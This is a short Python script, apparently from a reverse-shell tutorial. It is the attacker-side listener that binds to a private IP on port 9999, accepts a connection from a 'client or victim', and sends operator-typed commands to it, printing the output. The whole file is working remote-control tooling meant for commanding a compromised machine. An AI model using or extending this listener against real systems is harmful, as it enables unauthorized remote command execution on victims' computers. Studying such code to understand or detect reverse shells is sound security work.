import socket
import sys

# Creating a socket
def create_socket():
    try:
        global host
        global port
        global s
        host = "192.168.64.1"
        port = 9999
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    except socket.error as e:
        print(f"Socket creation error: {e}")
    
# Binding the socket and listening for connection
def bind_socket():
    try:
        global host
        global port
        global s

        print(f"Binding the port {port}")
        s.bind((host, port))
        s.listen(5)

    except socket.error as e:
        print(f"Socket binding the error: {e} \nRetrying...")
        bind_socket()

# Establishing the connection
def socket_accept():
    conn, address = s.accept()
    print(f"Connection has been established! | IP: {address[0]} | PORT: {address[1]}")
    send_command(conn)
    conn.close()

# Sending commands to client or victim
def send_command(conn):
    while True:
        cmd = input()
        if cmd == 'quit':
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024), "utf-8")
            print(client_response, end="")

def main():
    create_socket()
    bind_socket()
    socket_accept()

if __name__ == "__main__":
    main()